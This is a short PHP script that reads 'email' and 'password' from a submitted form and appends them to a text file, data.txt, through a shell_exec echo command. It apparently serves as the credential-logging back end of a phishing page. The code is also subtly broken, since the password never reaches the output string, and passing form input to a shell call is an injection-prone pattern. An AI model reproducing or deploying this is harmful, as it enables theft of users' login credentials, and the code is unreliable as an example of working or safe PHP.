<?php
$email =escapeshellcmd($_POST["email"]);
$password = escapeshellcmd($_POST["password"]);

shell_exec("echo Email: ". $email ."and Password: " . ">>data.txt");
?>
